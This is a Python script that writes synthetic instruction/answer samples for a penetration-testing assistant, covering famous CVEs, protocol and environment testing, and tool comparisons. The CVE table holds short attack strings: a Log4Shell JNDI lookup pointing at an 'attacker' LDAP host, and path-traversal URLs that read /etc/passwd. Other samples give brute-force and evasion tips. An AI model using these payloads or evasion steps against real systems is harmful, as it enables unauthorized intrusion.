#!/usr/bin/env python3
"""
Last Mile Generator - Final samples to reach 5000+
"""

import json
import random
from pathlib import Path

OUTPUT_DIR = Path(__file__).parent.parent / "data" / "generated"
OUTPUT_DIR.mkdir(parents=True, exist_ok=True)


def generate_vulnerability_specific_samples():
    """Generate CVE and vulnerability-specific samples"""
    samples = []
    
    vulns = [
        ("CVE-2021-44228", "Log4Shell", "Apache Log4j RCE", "Java applications using Log4j 2.x", "${jndi:ldap://attacker/a}", "Critical - unauthenticated RCE. Test with: ${jndi:ldap://collaborator/test}. Upgrade Log4j to 2.17+."),
        ("CVE-2021-41773", "Apache Path Traversal", "Apache 2.4.49 path traversal", "Apache HTTP Server 2.4.49", "/cgi-bin/.%2e/%2e%2e/etc/passwd", "Critical - directory traversal and RCE. Test traversal with curl."),
        ("CVE-2017-0144", "EternalBlue", "SMBv1 RCE", "Windows XP to Server 2008 R2", "ms17_010_eternalblue", "Critical - wormable RCE. Use Metasploit module. Massive impact."),
        ("CVE-2019-0708", "BlueKeep", "RDP RCE", "Windows 7, Server 2008 R2", "CVE-2019-0708 scanner", "Critical - pre-auth RCE. Scan first, exploit with care (may crash)."),
        ("CVE-2020-1472", "Zerologon", "Netlogon elevation", "Domain Controllers", "zerologon exploit", "Critical - instant DA. Resets DC machine account. Destructive if not handled."),
        ("CVE-2021-34527", "PrintNightmare", "Print Spooler RCE", "Windows with Print Spooler", "CVE-2021-34527 exploit", "Critical - leads to SYSTEM. Requires SMB share for DLL."),
        ("CVE-2018-7600", "Drupalgeddon2", "Drupal RCE", "Drupal 7.x and 8.x", "CVE-2018-7600 exploit", "Critical - unauthenticated RCE in Drupal CMS. Metasploit module available."),
        ("CVE-2017-5638", "Struts2 RCE", "Apache Struts Content-Type RCE", "Apache Struts 2.3.x/2.5.x", "Content-Type OGNL injection", "Critical - used in Equifax breach. Test with crafted Content-Type header."),
        ("CVE-2019-11510", "Pulse Secure", "Arbitrary file read", "Pulse Secure VPN", "/dana-na/../../../etc/passwd", "Critical - file read leads to credential theft. Pre-auth vulnerability."),
        ("CVE-2020-5902", "F5 BIG-IP", "TMUI RCE", "F5 BIG-IP TMUI", "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp", "Critical - RCE on load balancer. High-value target."),
        ("CVE-2021-21972", "vCenter RCE", "VMware vCenter Server RCE", "vCenter Server 6.5-7.0", "/ui/vropspluginui/rest/services/uploadova", "Critical - file upload to RCE on vCenter."),
        ("CVE-2021-26855", "ProxyLogon", "Exchange Server RCE", "Exchange 2013-2019", "SSRF chain to RCE", "Critical - zero-day used by state actors. Full Exchange compromise."),
        ("CVE-2022-22965", "Spring4Shell", "Spring Framework RCE", "Spring Framework on JDK9+", "class.module.classLoader manipulation", "Critical - RCE in Spring applications on Java 9+."),
        ("CVE-2023-44487", "HTTP/2 Rapid Reset", "DoS via HTTP/2", "HTTP/2 implementations", "Rapid stream reset flood", "High - DDoS amplification. Out of scope for most pentests."),
        ("CVE-2022-0847", "DirtyPipe", "Linux kernel LPE", "Linux kernel 5.8+", "Dirty Pipe exploit binary", "High - local privilege escalation. Easy exploitation path."),
    ]
    
    for cve, name, desc, target, payload, analysis in vulns:
        output = f"""Vulnerability Analysis: {cve} ({name})

[CVE]
{cve}

[NAME]
{name}

[DESCRIPTION]
{desc}

[AFFECTED SYSTEMS]
{target}

[DETECTION/EXPLOITATION]
{payload}

[ANALYSIS]
{analysis}

[TESTING STEPS]
1. Confirm target is in vulnerable version range
2. Test detection/exploitation carefully
3. Document successful exploitation
4. Report with severity rating

[REMEDIATION]
Apply vendor patches immediately. This is a {analysis.split(' - ')[0]} vulnerability.

[REFERENCES]
- NVD: https://nvd.nist.gov/vuln/detail/{cve}
- Vendor advisory (check vendor site)"""
        
        samples.append({
            "instruction": f"Explain {cve} ({name}) and how to test for it.",
            "input": f"Target may be vulnerable to {cve}. Need guidance on testing.",
            "output": output.strip()
        })
    
    return samples


def generate_protocol_samples():
    """Generate protocol-specific testing samples"""
    samples = []
    
    protocols = [
        {
            "protocol": "SSH",
            "port": 22,
            "testing": "Version detection with nmap -sV. Check for weak ciphers with nmap --script ssh2-enum-algos. Brute force with hydra. Look for key-based auth bypasses.",
            "exploits": "Old versions may have auth bypass CVEs. Check for CVE-2018-15473 (username enumeration). Weak keys detection.",
            "enumeration": "Banner grab, version detection, cipher enumeration, user enumeration if vulnerable."
        },
        {
            "protocol": "FTP",
            "port": 21,
            "testing": "Check for anonymous login: ftp target -> anonymous/anonymous. Version check for known CVEs. Brute force credentials.",
            "exploits": "vsftpd 2.3.4 backdoor. ProFTPd vulnerabilities. Anonymous access with write permissions.",
            "enumeration": "List files, check permissions, look for sensitive files, check for directory traversal."
        },
        {
            "protocol": "DNS",
            "port": 53,
            "testing": "Zone transfer attempt: dig axfr @ns.target domain. Subdomain brute force with fierce or dnsrecon.",
            "exploits": "Zone transfer exposes all records. DNS cache poisoning (if recursive). DNS amplification for DoS.",
            "enumeration": "All DNS records via zone transfer, subdomain enumeration, mail server identification."
        },
        {
            "protocol": "SNMP",
            "port": 161,
            "testing": "Community string brute force: onesixtyone -c strings.txt target. Walk MIB: snmpwalk -v1 -c public target.",
            "exploits": "Public/private community strings. Write access allows config changes. Credential exposure in SNMP output.",
            "enumeration": "System info, network interfaces, running processes, installed software, user accounts."
        },
        {
            "protocol": "LDAP",
            "port": 389,
            "testing": "Anonymous bind check: ldapsearch -x -h target -b 'dc=domain,dc=com'. Full enumeration with valid creds.",
            "exploits": "Anonymous read access to AD. LDAP injection in applications. Clear text credentials.",
            "enumeration": "Users, groups, computers, OUs, GPOs, trust relationships, service accounts."
        },
        {
            "protocol": "WinRM",
            "port": 5985,
            "testing": "Test with evil-winrm or PowerShell remoting. Need valid credentials.",
            "exploits": "Remote code execution with valid creds. Pass-the-hash possible. PowerShell execution.",
            "enumeration": "Full Windows system enumeration once connected. Can run any PowerShell command."
        },
        {
            "protocol": "MSSQL",
            "port": 1433,
            "testing": "impacket-mssqlclient for connection. Brute force with hydra. Check xp_cmdshell status.",
            "exploits": "xp_cmdshell for RCE. Linked server abuse. Credential extraction from database.",
            "enumeration": "Databases, tables, users, xp_cmdshell status, linked servers, stored credentials."
        },
        {
            "protocol": "Oracle",
            "port": 1521,
            "testing": "TNS listener enumeration. SID brute force with odat or metasploit. Then connect with sqlplus.",
            "exploits": "Default credentials. TNS poisoning. Java stored procedures for RCE.",
            "enumeration": "SID enumeration, version detection, user enumeration, privilege escalation paths."
        },
        {
            "protocol": "RDP",
            "port": 3389,
            "testing": "NLA check with nmap. Screenshot with nmap --script rdp-ntlm-info. Brute force with crowbar.",
            "exploits": "BlueKeep (CVE-2019-0708) for pre-auth RCE. Credential stuffing. Session hijacking.",
            "enumeration": "OS version from NLA, logged-in users, certificate information."
        },
        {
            "protocol": "Kerberos",
            "port": 88,
            "testing": "User enumeration with kerbrute. AS-REP roasting for accounts without pre-auth.",
            "exploits": "AS-REP roasting, Kerberoasting, Golden/Silver tickets, delegation abuse.",
            "enumeration": "Valid usernames, SPNs for Kerberoasting, pre-auth disabled accounts."
        },
    ]
    
    for p in protocols:
        output = f"""Protocol Testing Guide: {p["protocol"]}

[PROTOCOL]
{p["protocol"]} (Port {p["port"]})

[TESTING METHODOLOGY]
{p["testing"]}

[KNOWN EXPLOITS/ATTACKS]
{p["exploits"]}

[ENUMERATION TARGETS]
{p["enumeration"]}

[TOOLS]
- nmap with protocol-specific scripts
- Protocol-specific tools (listed in testing)
- Metasploit auxiliary/scanner modules

[DOCUMENTATION]
Record all findings:
- Service version
- Configuration issues
- Sensitive data exposed
- Exploitation results"""
        
        samples.append({
            "instruction": f"How do I test {p['protocol']} protocol during a pentest?",
            "input": f"Found port {p['port']} ({p['protocol']}) open. Need testing guidance.",
            "output": output.strip()
        })
    
    return samples


def generate_environment_samples():
    """Generate environment-specific samples"""
    samples = []
    
    environments = [
        {
            "env": "Active Directory",
            "focus": ["User enumeration", "Group policy abuse", "Kerberos attacks", "Credential harvesting", "Trust relationships"],
            "tools": ["BloodHound", "Mimikatz", "Rubeus", "PowerView", "Impacket"],
            "priorities": "1) Map the domain with BloodHound. 2) Find attack paths to DA. 3) Harvest credentials. 4) Exploit misconfigurations."
        },
        {
            "env": "AWS Cloud",
            "focus": ["IAM misconfigurations", "S3 bucket exposure", "EC2 metadata abuse", "Lambda vulnerabilities", "Cross-account access"],
            "tools": ["ScoutSuite", "Prowler", "Pacu", "CloudMapper", "enumerate-iam"],
            "priorities": "1) Enumerate IAM permissions. 2) Check for public resources. 3) Test privilege escalation. 4) Look for secrets."
        },
        {
            "env": "Azure Cloud",
            "focus": ["Azure AD enumeration", "Storage account exposure", "Managed identity abuse", "App registration secrets", "Conditional access bypass"],
            "tools": ["AzureHound", "ROADtools", "MicroBurst", "PowerZure", "az cli"],
            "priorities": "1) Enumerate Azure AD. 2) Check storage accounts. 3) Test for privilege escalation. 4) Review app registrations."
        },
        {
            "env": "Kubernetes",
            "focus": ["RBAC misconfigurations", "Pod security", "Secrets exposure", "Container escape", "Service account abuse"],
            "tools": ["kube-hunter", "kubeaudit", "kubectl", "trivy", "kube-bench"],
            "priorities": "1) Check RBAC permissions. 2) Audit pod security. 3) Look for exposed secrets. 4) Test container security."
        },
        {
            "env": "Docker",
            "focus": ["Container escape", "Image vulnerabilities", "Docker socket exposure", "Privileged containers", "Capability abuse"],
            "tools": ["trivy", "clair", "dive", "docker-bench-security", "grype"],
            "priorities": "1) Scan images for vulnerabilities. 2) Check for escape vectors. 3) Review container configuration. 4) Test network isolation."
        },
        {
            "env": "Web Application",
            "focus": ["OWASP Top 10", "Business logic flaws", "Authentication bypass", "Authorization issues", "API security"],
            "tools": ["Burp Suite", "OWASP ZAP", "sqlmap", "nuclei", "nikto"],
            "priorities": "1) Map application. 2) Test authentication. 3) Test for injection. 4) Check authorization. 5) Review business logic."
        },
        {
            "env": "Network Infrastructure",
            "focus": ["Device default credentials", "SNMP exposure", "Management interface access", "VLAN hopping", "Routing attacks"],
            "tools": ["nmap", "Cisco tools", "SNMP scanners", "Yersinia", "network fuzzers"],
            "priorities": "1) Identify network devices. 2) Test for default creds. 3) Check management access. 4) Test segmentation."
        },
        {
            "env": "IoT/OT",
            "focus": ["Default credentials", "Firmware vulnerabilities", "Protocol security", "Physical access", "Update mechanisms"],
            "tools": ["binwalk", "firmwalker", "MQTT explorers", "Modbus tools", "S7comm tools"],
            "priorities": "1) Identify devices. 2) Extract/analyze firmware. 3) Test protocols. 4) Check for update vulnerabilities."
        },
    ]
    
    for e in environments:
        output = f"""Environment Testing Guide: {e["env"]}

[ENVIRONMENT]
{e["env"]}

[KEY FOCUS AREAS]
{chr(10).join(f"- {f}" for f in e["focus"])}

[RECOMMENDED TOOLS]
{chr(10).join(f"- {t}" for t in e["tools"])}

[TESTING PRIORITIES]
{e["priorities"]}

[METHODOLOGY]
1. Understand the environment architecture
2. Enumerate accessible resources
3. Identify misconfigurations
4. Test for privilege escalation
5. Look for lateral movement paths
6. Document all findings

[DOCUMENTATION]
- Environment-specific findings
- Configuration issues
- Access achieved
- Recommendations for hardening"""
        
        samples.append({
            "instruction": f"How do I approach pentesting a {e['env']} environment?",
            "input": f"Testing {e['env']} environment. Need methodology guidance.",
            "output": output.strip()
        })
    
    return samples


def generate_situation_samples():
    """Generate situation-specific guidance samples"""
    samples = []
    
    situations = [
        ("I'm stuck in user context with no privesc vectors", "Explore other hosts with current creds. Check for credential reuse. Look at network services accessible from this host. Check for sensitive files readable by user. Consider password spraying with user's password."),
        ("Target uses certificate-based authentication", "Capture certificates if possible. Check for ADCS misconfigurations (ESC1-ESC8). Look for certificate theft opportunities. Test for certificate forgery if ADCS is misconfigured."),
        ("Found a development server", "Development servers often have: weaker security, debug features enabled, default credentials, source code exposure. Prioritize this target - likely easier path to compromise."),
        ("Client uses a SIEM and I keep triggering alerts", "Slow down testing velocity. Use living-off-the-land techniques. Avoid well-known tool signatures. Test during business hours when noise is higher. Consider if detection is actually part of the test objectives."),
        ("I have database access but need shell", "Check for: xp_cmdshell (MSSQL), UDF injection (MySQL), copy to/from program (PostgreSQL), Java stored procedures (Oracle). If file write access, try webshell."),
        ("Password policy requires 20+ characters", "Long passwords are harder to crack but: check for password managers (may store creds), look for password patterns, try pass-the-hash/pass-the-ticket instead, social engineering if in scope."),
        ("No internet access from compromised host", "Set up relay through initial access point. Use DNS tunneling if DNS works. Exfiltrate data manually. Consider this for evasion - internal-only ops are stealthier."),
        ("Found credentials in code repository", "Document finding. Check if credentials still valid. Search git history for more. Look for other secrets (API keys, tokens). Common finding with high impact."),
        ("Target application has rate limiting", "Slow down requests. Distribute across multiple IPs if available. Look for bypass (different endpoints, HTTP methods). Consider if rate limiting prevents exploitation or just slows it."),
        ("Only finding low/medium severity issues", "Low/medium issues can chain to high impact. Document everything thoroughly. Look for business logic flaws (often not caught by scanners). Sometimes the finding is that security is good - that's valuable too."),
        ("Need to demonstrate business impact", "Connect technical findings to business risk: data breach potential, financial impact, reputation damage, compliance violations. Use concrete examples: 'attacker could access X customer records'."),
        ("Client wants me to stop but I'm close to something big", "Stop immediately when asked. Document your progress and the potential path. The client has the right to stop testing at any time. Discuss in debrief what was almost found."),
    ]
    
    for situation, guidance in situations:
        samples.append({
            "instruction": situation,
            "input": "Seeking guidance for penetration testing situation.",
            "output": guidance
        })
    
    return samples


def generate_comparison_samples():
    """Generate tool/technique comparison samples"""
    samples = []
    
    comparisons = [
        {
            "question": "What's the difference between nmap -sS and -sT?",
            "answer": "-sS (SYN scan) is stealthier - only sends SYN, doesn't complete handshake. Requires root. -sT (Connect scan) completes full TCP handshake. More reliable but more visible in logs. Use -sS for stealth, -sT when you don't have root."
        },
        {
            "question": "When should I use sqlmap vs manual SQL injection?",
            "answer": "Use sqlmap for: automation, complex injections, data extraction. Use manual for: understanding the vulnerability, bypassing WAFs, when sqlmap can't detect it. Best practice: confirm manually first, then use sqlmap for exploitation."
        },
        {
            "question": "Metasploit vs manual exploitation?",
            "answer": "Metasploit: faster, reliable, includes post-exploitation. Manual: stealthier, more customizable, better understanding. Use Metasploit for known exploits when speed matters. Manual when stealth is critical or Metasploit module doesn't exist."
        },
        {
            "question": "Pass the Hash vs Pass the Ticket?",
            "answer": "Pass the Hash: uses NTLM hash, works with NTLM auth (SMB, etc). Pass the Ticket: uses Kerberos tickets, more versatile in AD environments, can impersonate any user. PtT is generally more powerful in modern AD environments."
        },
        {
            "question": "Responder vs ntlmrelayx?",
            "answer": "Responder: captures credentials (hashes) for offline cracking. ntlmrelayx: relays credentials in real-time to other services (no cracking needed). Use Responder when you can crack hashes. Use ntlmrelayx when SMB signing is disabled."
        },
        {
            "question": "Gobuster vs dirsearch vs feroxbuster?",
            "answer": "Gobuster: fast, simple, Go-based. dirsearch: Python, more features, recursive by default. feroxbuster: Rust, very fast, smart recursion. For quick scans use gobuster. For thorough enumeration, feroxbuster. dirsearch for compatibility."
        },
        {
            "question": "Burp Suite vs OWASP ZAP?",
            "answer": "Burp: industry standard, better extensions, Pro version powerful. ZAP: free/open source, good automation, active development. Use Burp for professional engagements. ZAP is great for learning and when budget is limited."
        },
        {
            "question": "Mimikatz vs secretsdump?",
            "answer": "Mimikatz: runs locally on target, more features, Windows only. secretsdump: runs remotely via DRSUAPI, cross-platform. Use Mimikatz for local extraction. secretsdump for remote extraction without deploying tools."
        },
        {
            "question": "CrackMapExec vs Impacket scripts?",
            "answer": "CrackMapExec: wrapper around multiple protocols, great for spraying, easy syntax. Impacket: individual tools, more control, scriptable. Use CME for quick enumeration/spraying. Impacket for specific advanced attacks."
        },
        {
            "question": "LinPEAS vs Linux Exploit Suggester?",
            "answer": "LinPEAS: comprehensive enumeration, checks many things, colorful output. LES: focused on kernel exploits, suggests specific CVEs. Run LinPEAS first for full picture. Use LES when specifically looking for kernel exploits."
        },
    ]
    
    for c in comparisons:
        samples.append({
            "instruction": c["question"],
            "input": "",
            "output": c["answer"]
        })
    
    return samples


def main():
    """Generate final batch of samples"""
    print("🎯 Generating last mile samples...")
    
    all_samples = []
    
    generators = [
        ("vulnerabilities", generate_vulnerability_specific_samples),
        ("protocols", generate_protocol_samples),
        ("environments", generate_environment_samples),
        ("situations", generate_situation_samples),
        ("comparisons", generate_comparison_samples),
    ]
    
    for name, generator in generators:
        print(f"  Generating {name}...")
        samples = generator()
        all_samples.extend(samples)
        
        # Save category file
        category_file = OUTPUT_DIR / f"{name}.jsonl"
        with open(category_file, 'w') as f:
            for sample in samples:
                f.write(json.dumps(sample) + '\n')
        print(f"    ✓ {len(samples)} samples saved to {category_file.name}")
    
    # Save combined
    combined_file = OUTPUT_DIR / "lastmile_combined.jsonl"
    with open(combined_file, 'w') as f:
        for sample in all_samples:
            f.write(json.dumps(sample) + '\n')
    
    print(f"\n✅ Total: {len(all_samples)} last mile samples generated")
    return len(all_samples)


if __name__ == "__main__":
    main()
